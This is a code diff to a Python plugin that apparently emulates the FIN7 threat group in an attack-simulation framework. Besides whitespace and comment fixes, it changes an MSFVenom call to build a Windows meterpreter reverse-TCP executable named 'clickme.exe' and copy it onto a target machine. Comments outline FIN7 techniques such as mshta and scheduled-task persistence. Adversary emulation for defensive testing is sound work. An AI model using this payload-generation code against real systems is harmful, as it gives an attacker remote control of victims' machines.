@@ -8,7 +8,6 @@ from app.metasploit import MSFVenom
 import os
 
 
-
 class FIN7Plugin(AttackPlugin):
 
     # Boilerplate
@@ -33,7 +32,6 @@ class FIN7Plugin(AttackPlugin):
         # mshta copies wscript.exe to ADB156.exe
         # winword.exe spawns verclsid.exe
         # mshta uses taskschd.dll to create a task in 5 minutes
-
 
         self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}End Step 1: Initial Breach{CommandlineColors.ENDC}", 1)
 
@@ -70,7 +68,7 @@ class FIN7Plugin(AttackPlugin):
 
         # TODO: query computername https://attack.mitre.org/techniques/T1082/
         # self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query COMPUTERNAME env{CommandlineColors.ENDC}", 1)
-        #self.caldera_attack(self.targets[0], "c0da588f-79f0-4263-8998-7496b1a40596")
+        # self.caldera_attack(self.targets[0], "c0da588f-79f0-4263-8998-7496b1a40596")
 
         # TODO: load adsldp.dll and call dllGetClassObject() for the Windows Script Host ADSystemInfo Object COM object https://attack.mitre.org/techniques/T1082/
         # WMI query for System Network Configuration discovery https://attack.mitre.org/techniques/T1016/
@@ -100,12 +98,12 @@ class FIN7Plugin(AttackPlugin):
 
         payload_name = "clickme.exe"
         venom = MSFVenom(self.attacker_machine_plugin, self.targets[0])
-        venom.generate_payload(payload="linux/x64/meterpreter_reverse_tcp",
-                             architecture="x64",
-                             platform="linux",
-                             # lhost,
-                             format="elf",
-                             outfile=payload_name)
+        venom.generate_payload(payload="windows/x64/meterpreter_reverse_tcp",
+                               architecture="x64",
+                               platform="windows",
+                               # lhost,
+                               format="exe",
+                               outfile=payload_name)
         self.attacker_machine_plugin.get(payload_name, self.targets[0].get_machine_path_external())
         src = os.path.join(self.targets[0].get_machine_path_external(), payload_name)
         self.targets[0].put(src, self.targets[0].get_playground())
